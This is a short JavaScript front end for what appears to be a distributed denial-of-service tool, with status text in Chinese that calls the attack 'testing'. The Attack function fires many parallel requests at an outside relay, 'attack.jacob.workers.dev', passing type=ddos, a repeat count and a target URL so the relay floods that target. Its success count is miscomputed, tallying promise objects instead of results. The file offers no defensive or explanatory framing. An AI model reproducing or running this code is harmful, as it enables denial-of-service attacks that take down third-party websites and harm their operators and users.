function atk(a, b, c) {
    document.getElementById('result').innerHTML = "測試進行中";
    Attack(parseInt(a), parseInt(b), c, "ddos", {update: function(now){document.getElementById('result').innerHTML = "已完成： " + now}}).then(s => {document.getElementById('result').innerHTML = "完成全部共"+s.success+"次測試";});
}
async function Attack(blocks=10, attacks=10, target, type="ddos", func={update: function(){}}) {
    var now = 0;
    var requests = [];
    
    for(var i = 0; i < blocks; i++) {
        requests.push(
            fetch(`https://attack.jacob.workers.dev/?type=${type}&time=${attacks}&url=${target}`).then(r=>{
                now += attacks;
                func.update(parseInt(now));
                return r.ok;
            })
        );
    }
    
    var resp = await Promise.all(requests);
    
    var success = 0;
    for(var i = 0; i < requests.length; i++) {
        if (requests[i]) success++;
    }
    return {success: success * attacks};
}
